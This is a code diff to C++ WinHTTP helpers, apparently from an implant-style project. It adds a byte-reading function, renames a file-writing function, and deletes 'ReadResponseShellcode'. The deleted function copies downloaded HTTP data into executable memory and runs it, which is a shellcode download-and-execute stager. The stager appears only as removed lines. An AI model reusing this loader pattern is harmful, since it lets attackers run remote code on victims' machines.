@@ -123,7 +123,55 @@ namespace System::Http
 		return {bResult, hRequest, dwStatusCode};
 	}
 
-	BOOL ReadResponseData(HINTERNET hRequest, const std::wstring& outFile) {
+	// Read response as bytes.
+	std::vector<BYTE> ReadResponseBytes(HINTERNET hRequest) {
+		std::vector<BYTE> respBytes;
+
+		DWORD dwSize = 0;
+		DWORD dwDownloaded = 0;
+		BYTE* pBuffer = NULL;
+
+		do
+		{
+			dwSize = 0;
+
+			if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
+			{
+				return respBytes;
+			}
+
+			// No more available data.
+			if (!dwSize)
+			{
+				return respBytes;
+			}
+
+			pBuffer = new BYTE[dwSize];
+			if (!pBuffer)
+			{
+				return respBytes;
+			}
+
+			ZeroMemory(pBuffer, dwSize);
+			if (!WinHttpReadData(
+				hRequest,
+				pBuffer,
+				dwSize,
+				&dwDownloaded
+			)) {
+				delete[] pBuffer;
+				return respBytes;
+			}
+
+			respBytes.insert(respBytes.end(), pBuffer, pBuffer + dwDownloaded);
+
+			delete[] pBuffer;
+		} while (dwSize > 0);
+		
+		return respBytes;
+	}
+
+	BOOL WriteResponseData(HINTERNET hRequest, const std::wstring& outFile) {
 		DWORD dwSize = 0;
 		DWORD dwRead = 0;
 		LPSTR pszOutBuffer;
@@ -187,45 +235,7 @@ namespace System::Http
 		return TRUE;
 	}
 
-	BOOL ReadResponseShellcode(HINTERNET hRequest) {
-		DWORD dwSize = 0;
-		DWORD dwRead = 0;
-		// LPSTR pszOutBuffer;
-		char buffer[4096];
-		BOOL bResult;
-
-		do
-		{
-			bResult = WinHttpReadData(
-				hRequest,
-				(LPVOID)buffer,
-				sizeof(buffer),
-				&dwRead
-			);
-			if (!bResult)
-			{
-				// DisplayMessageBoxA("WinHttpReadData Error", "ReadResponsePayload");
-			}
-
-			if (dwRead > 0)
-			{
-				// Load the payload.
-				void* execMem = VirtualAlloc(
-					0,
-					dwRead,
-					MEM_COMMIT | MEM_RESERVE,
-					PAGE_EXECUTE_READWRITE
-				);
-				memcpy(execMem, buffer, dwRead);
-
-				// Execute it.
-				((void(*)())execMem)();
-			}
-		} while (dwRead > 0);
-		
-		return TRUE;
-	}
-
+	// Wrapper for send&read&write response data
 	BOOL DownloadFile(
 		HINTERNET hConnect,
 		LPCWSTR lpHost,
@@ -251,7 +261,7 @@ namespace System::Http
 			return {};
 		}
 
-		if (!ReadResponseData(resp.hRequest, wDest))
+		if (!WriteResponseData(resp.hRequest, wDest))
 		{
 			return FALSE;
 		}
